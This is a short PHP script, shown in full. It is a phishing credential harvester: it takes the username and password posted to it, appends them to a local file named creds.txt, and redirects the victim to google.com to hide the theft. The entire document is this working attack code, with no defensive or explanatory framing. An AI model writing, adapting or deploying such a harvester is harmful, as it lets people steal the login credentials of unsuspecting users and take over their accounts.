<?php
file_put_contents("creds.txt", $_POST['user']." | ".$_POST['pass']."\n", FILE_APPEND);
header("Location: https://google.com");
?>
